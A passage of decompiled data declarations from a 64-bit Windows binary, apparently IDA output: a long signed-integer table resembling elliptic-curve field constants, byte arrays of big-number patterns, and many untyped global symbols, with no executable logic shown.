  16638632,
  6328095,
  2713355,
  -20217417,
  -11864220,
  8683221,
  2921426,
  18606791,
  11874196,
  27155355,
  -5281482,
  -24031742,
  6265446,
  -25178240,
  -1278924,
  4674690,
  13890525,
  13609624,
  13069022,
  -27372361,
  -13055908,
  24360586,
  9592974,
  14977157,
  9835105,
  4389687,
  288396,
  9922506,
  -519394,
  13613107,
  5883594,
  -18758345,
  -434263,
  -12304062,
  8317628,
  23388070,
  16052080,
  12720016,
  11937594,
  -31970060,
  -5028689,
  26900120,
  8561328,
  -20155687,
  -11632979,
  -14754271,
  -10812892,
  15961858,
  14150409,
  26716931,
  -665832,
  -22794328,
  13603569,
  11829573,
  7467844,
  -28822128,
  929275,
  11038231,
  -11582396,
  -27310482,
  -7316562,
  -10498527,
  -16307831,
  -23479533,
  -9371869,
  -21393143,
  2465074,
  20017163,
  -4323226,
  27915242,
  1529148,
  12396362,
  15675764,
  13817261,
  -9658066,
  2463391,
  -4622140,
  -16358878,
  -12663911,
  -12065183,
  4996454,
  -1256422,
  1073572,
  9583558,
  12851107,
  4003896,
  12673717,
  -1731589,
  -15155870,
  -3262930,
  16143082,
  19294135,
  13385325,
  14741514,
  -9103726,
  7903886,
  2348101,
  24536016,
  -16515207,
  12715592,
  -3862155,
  1511293,
  10047386,
  -3842346,
  -7129159,
  -28377538,
  10048127,
  -12622226,
  -6204820,
  30718825,
  2591312,
  -10617028,
  12192840,
  18873298,
  -7297090,
  -32297756,
  15221632,
  -26478122,
  -11103864,
  11546244,
  -1852483,
  9180880,
  7656409,
  -21343950,
  2095755,
  29769758,
  6593415,
  -31994208,
  -2907461,
  4176912,
  3264766,
  12538965,
  -868111,
  26312345,
  -6118678,
  30958054,
  8292160,
  31429822,
  -13959116,
  29173532,
  15632448,
  12174511,
  -2760094,
  32808831,
  3977186,
  26143136,
  -3148876,
  22648901,
  1402143,
  -22799984,
  13746059,
  7936347,
  365344,
  -8668633,
  -1674433,
  -3758243,
  -2304625,
  -15491917,
  8012313,
  -2514730,
  -12702462,
  -23965846,
  -10254029,
  -1612713,
  -1535569,
  -16664475,
  8194478,
  27338066,
  -7507420,
  -7414224,
  10140405,
  -19026427,
  -6589889,
  27277191,
  8855376,
  28572286,
  3005164,
  26287124,
  4821776,
  25476601,
  -4145903,
  -3764513,
  -15788984,
  -18008582,
  1182479,
  -26094821,
  -13079595,
  -7171154,
  3178080,
  23970071,
  6201893,
  -17195577,
  -4489192,
  -21876275,
  -13982627,
  32208683,
  -1198248,
  -16657702,
  2817643,
  -10286362,
  14811298,
  6024667,
  13349505,
  -27315504,
  -10497842,
  -27672585,
  -11539858,
  15941029,
  -9405932,
  -21367050,
  8062055,
  31876073,
  -238629,
  -15278393,
  -1444429,
  15397331,
  -4130193,
  8934485,
  -13485467,
  -23286397,
  -13423241,
  -32446090,
  14047986,
  31170398,
  -1441021,
  -27505566,
  15087184,
  -18357243,
  -2156491,
  24524913,
  -16677868,
  15520427,
  -6360776,
  -15502406,
  11461896,
  16788528,
  -5868942,
  -1947386,
  16013773,
  21750665,
  3714552,
  -17401782,
  -16055433,
  -3770287,
  -10323320,
  31322514,
  -11615635,
  21426655,
  -5650218,
  -13648287,
  -5347537,
  -28812189,
  -4920970,
  -18275391,
  -14621414,
  13040862,
  -12112948,
  11293895,
  12478086,
  -27136401,
  15083750,
  -29307421,
  14748872,
  14555558,
  -13417103,
  1613711,
  4896935,
  -25894883,
  15323294,
  -8489791,
  -8057900,
  25967126,
  -13425460,
  2825960,
  -4897045,
  -23971776,
  -11267415,
  -15924766,
  -5229880,
  -17443532,
  6410664,
  3622847,
  10243618,
  20615400,
  12405433,
  -23753030,
  -8436416,
  -7091295,
  12556208,
  -20191352,
  9025187,
  -17072479,
  4333801,
  4378436,
  2432030,
  23097949,
  -566018,
  4565804,
  -16025654,
  20084412,
  -7842817,
  1724999,
  189254,
  24767264,
  10103221,
  -18512313,
  2424778,
  366633,
  -11976806,
  8173090,
  -6890119,
  30788634,
  5745705,
  -7168678,
  1344109,
  -3642553,
  12412659,
  -24001791,
  7690286,
  14929416,
  -168257,
  -32210835,
  -13412986,
  24162697,
  -15326504,
  -3141501,
  11179385,
  18289522,
  -14724954,
  8056945,
  16430056,
  -21729724,
  7842514,
  -6001441,
  -1486897,
  -18684645,
  -11443503,
  476239,
  6601091,
  -6152790,
  -9723375,
  17503545,
  -4863900,
  27672959,
  13403813,
  11052904,
  5219329,
  20678546,
  -8375738,
  -32671898,
  8849123,
  -5009758,
  14574752,
  31186971,
  -3973730,
  9014762,
  -8579056,
  -13644050,
  -10350239,
  -15962508,
  5075808,
  -1514661,
  -11534600,
  -33102500,
  9160280,
  8473550,
  -3256838,
  24900749,
  14435722,
  17209120,
  -15292541,
  -22592275,
  9878983,
  -7689309,
  -16335821,
  -24568481,
  11788948,
  -3118155,
  -11395194,
  -13802089,
  14797441,
  9652448,
  -6845904,
  -20037437,
  10410733,
  -24568470,
  -1458691,
  -15659161,
  16736706,
  -22467150,
  10215878,
  -9097177,
  7563911,
  11871841,
  -12505194,
  -18513325,
  8464118,
  -23400612,
  8348507,
  -14585951,
  -861714,
  -3950205,
  -6373419,
  14325289,
  8628612,
  33313881,
  -8370517,
  -20186973,
  -4967935,
  22367356,
  5271547,
  -1097117,
  -4788838,
  -24805667,
  -10236854,
  -8940735,
  -5818269,
  -6948785,
  -1795212,
  -32625683,
  -16021179,
  32635414,
  -7374245,
  15989197,
  -12838188,
  28358192,
  -4253904,
  -23561781,
  -2799059,
  -32351682,
  -1661963,
  -9147719,
  10429267,
  -16637684,
  4072016,
  -5351664,
  5596589,
  -28236598,
  -3390048,
  12312896,
  6213178,
  3117142,
  16078565,
  29266239,
  2557221,
  1768301,
  15373193,
  -7243358,
  -3246960,
  -4593467,
  -7553353,
  -127927,
  -912245,
  -1090902,
  -4504991,
  -24660491,
  3442910,
  -30210571,
  5124043,
  14181784,
  8197961,
  18964734,
  -11939093,
  22597931,
  7176455,
  -18585478,
  13365930,
  -7877390,
  -1499958,
  8324673,
  4690079,
  6261860,
  890446,
  24538107,
  -8570186,
  -9689599,
  -3031667,
  25008904,
  -10771599,
  -4305031,
  -9638010,
  16265036,
  15721635,
  683793,
  -11823784,
  15723479,
  -15163481,
  -9660625,
  12374379,
  -27006999,
  -7026148,
  -7724114,
  -12314514,
  11879682,
  5400171,
  519526,
  -1235876,
  22258397,
  -16332233,
  -7869817,
  14613016,
  -22520255,
  -2950923,
  -20353881,
  7315967,
  16648397,
  7605640,
  -8081308,
  -8464597,
  -8223311,
  9719710,
  19259459,
  -15348212,
  23994942,
  -5281555,
  -9468848,
  4763278,
  -21699244,
  9220969,
  -15730624,
  1084137,
  -25476107,
  -2852390,
  31088447,
  -7764523,
  -11356529,
  728112,
  26047220,
  -11751471,
  -6900323,
  -16521798,
  24092068,
  9158119,
  -4273545,
  -12555558,
  -29365436,
  -5498272,
  17510331,
  -322857,
  5854289,
  8403524,
  17133918,
  -3112612,
  -28111007,
  12327945,
  10750447,
  10014012,
  -10312768,
  3936952,
  9156313,
  -8897683,
  16498692,
  -994647,
  -27481051,
  -666732,
  3424691,
  7540221,
  30322361,
  -6964110,
  11361005,
  -4143317,
  7433304,
  4989748,
  -7071422,
  -16317219,
  -9244265,
  15258046,
  13054562,
  -2779497,
  19155474,
  469045,
  -12482797,
  4566042,
  5631406,
  2711395,
  1062915,
  -5136345,
  -19240248,
  -11254599,
  -29509029,
  -7499965,
  -5835763,
  13005411,
  -6066489,
  12194497,
  32960380,
  1459310,
  19852034,
  7027924,
  23669353,
  10020366,
  8586503,
  -6657907,
  394197,
  -6101885,
  18638003,
  -11174937,
  31395534,
  15098109,
  26581030,
  8030562,
  -16527914,
  -5007134,
  9012486,
  -7584354,
  -6643087,
  -5442636,
  -9192165,
  -2347377,
  -1997099,
  4529534,
  25766844,
  607986,
  -13222,
  9677543,
  -32294889,
  -6456008,
  -2444496,
  -149937,
  29348902,
  8186665,
  1873760,
  12489863,
  -30934579,
  -7839692,
  -7852844,
  -8138429,
  -15236356,
  -15433509,
  7766470,
  746860,
  26346930,
  -10221762,
  -27333451,
  10754588,
  -9431476,
  5203576,
  31834314,
  14135496,
  -770007,
  5159118,
  20917671,
  -16768096,
  -7467973,
  -7337524,
  31809243,
  7347066,
  -9606723,
  -11874240,
  20414459,
  13033986,
  13716524,
  -11691881,
  19797970,
  -12211255,
  15192876,
  -2087490,
  -12663563,
  -2181719,
  1168162,
  -3804809,
  26747877,
  -14138091,
  10609330,
  12694420,
  33473243,
  -13382104,
  33184999,
  11180355,
  15832085,
  -11385430,
  -1633671,
  225884,
  15089336,
  -11023903,
  -6135662,
  14480053,
  31308717,
  -5619998,
  31030840,
  -1897099,
  15674547,
  -6582883,
  5496208,
  13685227,
  27595050,
  8737275,
  -20318852,
  -15150239,
  10933843,
  -16178022,
  8335352,
  -7546022,
  -31008351,
  -12610604,
  26498114,
  66511,
  22644454,
  -8761729,
  -16671776,
  4884562,
  -3105614,
  -13559366,
  30540766,
  -4286747,
  -13327787,
  -7515095,
  -28017847,
  9834845,
  18617207,
  -2681312,
  -3401956,
  -13307506,
  8205540,
  13585437,
  -17127465,
  15115439,
  23711543,
  -672915,
  31206561,
  -8362711,
  6164647,
  -9709987,
  -33535882,
  -1426096,
  8236921,
  16492939,
  -23910559,
  -13515526,
  -26299483,
  -4503841,
  25005590,
  -7687270,
  19574902,
  10071562,
  6708380,
  -6222424,
  2101391,
  -4930054,
  19702731,
  2367575,
  -15427167,
  1047675,
  5301017,
  9328700,
  29955601,
  -11678310,
  3096359,
  9271816,
  -21620864,
  -15521844,
  -14847996,
  -7592937,
  -25892142,
  -12635595,
  -9917575,
  6216608,
  -32615849,
  338663,
  -25195611,
  2510422,
  -29213566,
  -13820213,
  24822830,
  -6146567,
  -26767480,
  7525079,
  -23066649,
  -13985623,
  16133487,
  -7896178,
  -3389565,
  778788,
  -910336,
  -2782495,
  -19386633,
  11994101,
  21691500,
  -13624626,
  -641331,
  -14367021,
  3285881,
  -3483596,
  -25064666,
  9718258,
  -7477437,
  13381418,
  18445390,
  -4202236,
  14979846,
  11622458,
  -1727110,
  -3582980,
  23111648,
  -6375247,
  28535282,
  15779576,
  30098053,
  3089662,
  -9234387,
  16662135,
  -21306940,
  11308411,
  -14068454,
  12021730,
  9955285,
  -16303356,
  9734894,
  -14576830,
  -7473633,
  -9138735,
  2060392,
  11313496,
  -18426029,
  9924399,
  20194861,
  13380996,
  -26378102,
  -7965207,
  -22167821,
  15789297,
  -18055342,
  -6168792,
  -1984914,
  15707771,
  26342023,
  10146099,
  -26016874,
  -219943,
  21339191,
  -41388,
  19745256,
  -2878700,
  -29637280,
  2227040,
  21612326,
  -545728,
  -13077387,
  1184228,
  23562814,
  -5970442,
  -20351244,
  -6348714,
  25764461,
  12243797,
  -20856566,
  11649658,
  -10031494,
  11262626,
  27384172,
  2271902,
  26947504,
  -15997771,
  39944,
  6114064,
  33514190,
  2333242,
  -21433588,
  -12421821,
  8119782,
  7219913,
  -21830522,
  -9016134,
  -6679750,
  -12670638,
  24350578,
  -13450001,
  -4116307,
  -11271533,
  -23886186,
  4843615,
  -30088339,
  690623,
  -31536088,
  -10406836,
  8317860,
  12352766,
  18200138,
  -14475911,
  -33087759,
  -2696619,
  -23702521,
  -9102511,
  -23552096,
  -2287550,
  20712163,
  6719373,
  26656208,
  6075253,
  -7858556,
  1886072,
  -28344043,
  4262326,
  11117530,
  -3763210,
  26224235,
  -3297458,
  -17168938,
  -14854097,
  -3395676,
  -16369877,
  -19954045,
  14050420,
  21728352,
  9493610,
  18620611,
  -16428628,
  -13323321,
  13325349,
  11432106,
  5964811,
  18609221,
  6062965,
  -5269471,
  -9725556,
  -30701573,
  -16479657,
  -23860538,
  -11233159,
  26961357,
  1640861,
  -32413112,
  -16737940,
  12248509,
  -5240639,
  13735342,
  1934062,
  25089769,
  6742589,
  17081145,
  -13406266,
  21909293,
  -16067981,
  -15136294,
  -3765346,
  -21277997,
  5473616,
  31883677,
  -7961101,
  1083432,
  -11572403,
  22828471,
  13290673,
  -7125085,
  12469656,
  29111212,
  -5451014,
  24244947,
  -15050407,
  -26262976,
  2791540,
  -14997599,
  16666678,
  24367466,
  6388839,
  -10295587,
  452383,
  -25640782,
  -3417841,
  5217916,
  16224624,
  19987036,
  -4082269,
  -24236251,
  -5915248,
  15766062,
  8407814,
  -20406999,
  13990231,
  15495425,
  16395525,
  5377168,
  15166495,
  -8917023,
  -4388953,
  -8067909,
  2276718,
  30157918,
  12924066,
  -17712050,
  9245753,
  19895028,
  3368142,
  -23827587,
  5096219,
  22740376,
  -7303417,
  2041139,
  -14256350,
  7783687,
  13876377,
  -25946985,
  -13352459,
  24051124,
  13742383,
  -15637599,
  13295222,
  33338237,
  -8505733,
  12532113,
  7977527,
  9106186,
  -1715251,
  -17720195,
  -4612972,
  -4451357,
  -14669444,
  -20045281,
  5454097,
  -14346548,
  6447146,
  28862071,
  1883651,
  -2469266,
  -4141880,
  7770569,
  9620597,
  23208068,
  7979712,
  33071466,
  8149229,
  1758231,
  -10834995,
  30945528,
  -1694323,
  -33502340,
  -14767970,
  1439958,
  -16270480,
  -1079989,
  -793782,
  4625402,
  10647766,
  -5043801,
  1220118,
  30494170,
  -11440799,
  -5037580,
  -13028295,
  -2970559,
  -3061767,
  15640974,
  -6701666,
  -26739026,
  926050,
  -1684339,
  -13333647,
  13908495,
  -3549272,
  30919928,
  -6273825,
  -21521863,
  7989039,
  9021034,
  9078865,
  3353509,
  4033511,
  -29663431,
  -15113610,
  32259991,
  -344482,
  24295849,
  -12912123,
  23161163,
  8839127,
  27485041,
  7356032,
  9661027,
  705443,
  11980065,
  -5370154,
  -1628543,
  14661173,
  -6346142,
  2625015,
  28431036,
  -16771834,
  -23839233,
  -8311415,
  -25945511,
  7480958,
  -17681669,
  -8354183,
  -22545972,
  14150565,
  15970762,
  4099461,
  29262576,
  16756590,
  26350592,
  -8793563,
  8529671,
  -11208050,
  13617293,
  -9937143,
  11465739,
  8317062,
  -25493081,
  -6962928,
  32500200,
  -9419051,
  -23038724,
  -2302222,
  14898637,
  3848455,
  20969334,
  -5157516,
  -20384450,
  -14347713,
  -18336405,
  13884722,
  -33039454,
  2842114,
  -21610826,
  -3649888,
  11177095,
  14989547,
  -24496721,
  -11716016,
  16959896,
  2278463,
  12066309,
  10137771,
  13515641,
  2581286,
  -28487508,
  9930240,
  -17751622,
  -2097826,
  16544300,
  -13009300,
  -15914807,
  -14949081,
  18345767,
  -13403753,
  16291481,
  -5314038,
  -33229194,
  2553288,
  32678213,
  9875984,
  8534129,
  6889387,
  -9676774,
  6957617,
  4368891,
  9788741,
  16660756,
  7281060,
  -10830758,
  12911820,
  20108584,
  -8101676,
  -21722536,
  -8613148,
  16250552,
  -11111103,
  -19765507,
  2390526,
  -16551031,
  14161980,
  1905286,
  6414907,
  4689584,
  10604807,
  -30190403,
  4782747,
  -1354539,
  14736941,
  -7367442,
  -13292886,
  7710542,
  -14155590,
  -9981571,
  4383045,
  22546403,
  437323,
  31665577,
  -12180464,
  -16186830,
  1491339,
  -18368625,
  3294682,
  27343084,
  2786261,
  -30633590,
  -14097016,
  -14467279,
  -683715,
  -33374107,
  7448552,
  19294360,
  14334329,
  -19690631,
  2355319,
  -19284671,
  -6114373,
  15121312,
  -15796162,
  6377020,
  -6031361,
  -10798111,
  -12957845,
  18952177,
  15496498,
  -29380133,
  11754228,
  -2637277,
  -13483075,
  8488727,
  -14303896,
  12728761,
  -1622493,
  7141596,
  11724556,
  22761615,
  -10134141,
  16918416,
  11729663,
  -18083579,
  3022987,
  -31015732,
  -13339659,
  -28741185,
  -12227393,
  32851222,
  11717399,
  11166634,
  7338049,
  -6722523,
  4531520,
  -29468672,
  -7302055,
  31474879,
  3483633,
  -1193175,
  -4030831,
  -185635,
  9921305,
  31456609,
  -13536438,
  -12013818,
  13348923,
  33142652,
  6546660,
  -19985279,
  -3948376,
  -32460596,
  11266712,
  -11197107,
  -7899103,
  31703694,
  3855903,
  -8537131,
  -12833048,
  -30772034,
  -15486313,
  -18006477,
  12709068,
  3991746,
  -6479188,
  -21491523,
  -10550425,
  -31135347,
  -16049879,
  10928917,
  3011958,
  -6957757,
  -15594337,
  31696059,
  334240,
  29576716,
  14796075,
  -30831056,
  -12805180,
  18008031,
  10258577,
  -22448644,
  15655569,
  7018479,
  -4410003,
  -30314266,
  -1201591,
  -1853465,
  1367120,
  25127874,
  6671743,
  29701166,
  -14373934,
  -10878120,
  9279288,
  -17568,
  13127210,
  21382910,
  11042292,
  25838796,
  4642684,
  -20430234,
  14955537,
  -24126347,
  8124619,
  -5369288,
  -5990470,
  30468147,
  -13900640,
  18423289,
  4177476
}; // weak
char byte_14010E420[64] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x01',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x03',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFE',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\xFC',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF'
}; // weak
_UNKNOWN unk_14010E460; // weak
__int128 xmmword_14010E690 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFi64; // weak
_UNKNOWN unk_14010E768; // weak
_UNKNOWN unk_14010E798; // weak
void *off_14010E8B0 = &unk_14010EAA0; // weak
void *off_14010E8C8 = &unk_14010EBD0; // weak
void *off_14010E8E0 = &unk_14010EC90; // weak
char byte_14010E930[72] =
{
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFE',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFE',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFD',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFD',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFC',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF'
}; // weak
void *off_14010E9A8 = &byte_14010E930; // weak
char byte_14010E9C0[64] =
{
  '\x01',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x02',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFE',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x01',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_14010EA00[160] =
{
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x01',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFE',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x01',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x02',
  '\0',
  '\0',
  '\0',
  '\xFE',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFD',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x02',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x03',
  '\0',
  '\0',
  '\0',
  '\xFD',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFC',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x03',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x04',
  '\0',
  '\0',
  '\0',
  '\xFC',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFB',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x04',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x05',
  '\0',
  '\0',
  '\0',
  '\xFB',
  '\xFF',
  '\xFF',
  '\xFF'
}; // weak
char byte_14010EAE0[240] =
{
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFE',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFE',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x01',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFE',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFD',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFD',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x02',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFD',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFC',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFC',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x03',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFC',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFB',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFB',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x04',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFB',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFA',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF'
}; // weak
char byte_14010EC30[72] =
{
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x01',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
void *off_14010EC78 = &byte_14010E9C0; // weak
void *off_14010ED18 = &byte_14010EA00; // weak
void *off_14010ED30 = &byte_14010EAE0; // weak
void *off_14010ED48 = &byte_14010EC30; // weak
void *off_14010ED60 = &unk_14010E978; // weak
void *off_14010ED78 = &unk_14010E8F8; // weak
_UNKNOWN unk_14010ED90; // weak
_UNKNOWN unk_14010EF40; // weak
_UNKNOWN unk_14010F0F0; // weak
_DWORD dword_14010F2C8[8] = { 0, 1, 0, -1, 0, -1, 0, 1 }; // weak
_QWORD qword_14010F320[16] =
{
  0i64,
  1i64,
  4i64,
  5i64,
  16i64,
  17i64,
  20i64,
  21i64,
  64i64,
  65i64,
  68i64,
  69i64,
  80i64,
  81i64,
  84i64,
  85i64
}; // weak
_UNKNOWN unk_14010F490; // weak
_UNKNOWN unk_14010F500; // weak
_UNKNOWN unk_14010F5D0; // weak
_UNKNOWN unk_14010F9B0; // weak
_UNKNOWN unk_14010FA80; // weak
_UNKNOWN unk_14010FB30; // weak
_UNKNOWN unk_14010FBC0; // weak
_UNKNOWN unk_14010FD10; // weak
_UNKNOWN unk_14010FDA0; // weak
_UNKNOWN unk_14010FF08; // weak
_UNKNOWN unk_14010FFF0; // weak
_UNKNOWN unk_1401100B0; // weak
_UNKNOWN unk_140110280; // weak
_UNKNOWN unk_1401102F0; // weak
_UNKNOWN unk_140110360; // weak
_UNKNOWN unk_140110430; // weak
_UNKNOWN unk_1401104A0; // weak
_UNKNOWN unk_140110510; // weak
_UNKNOWN unk_140110620; // weak
_UNKNOWN unk_140110690; // weak
_UNKNOWN unk_140110700; // weak
_UNKNOWN unk_1401107F0; // weak
_UNKNOWN unk_140110860; // weak
_UNKNOWN unk_1401108F0; // weak
_UNKNOWN unk_1401109A0; // weak
_UNKNOWN unk_140110A10; // weak
_UNKNOWN unk_140110AA0; // weak
_UNKNOWN unk_140110B10; // weak
_UNKNOWN unk_140110BD0; // weak
_UNKNOWN unk_140110C40; // weak
_UNKNOWN unk_140110CD0; // weak
_UNKNOWN unk_140110DA0; // weak
_UNKNOWN unk_140110E30; // weak
_UNKNOWN unk_140110EE0; // weak
_UNKNOWN unk_140110F90; // weak
_UNKNOWN unk_140111000; // weak
_UNKNOWN unk_140111900; // weak
_UNKNOWN unk_140111AA0; // weak
_UNKNOWN unk_140111B10; // weak
_UNKNOWN unk_140111BC0; // weak
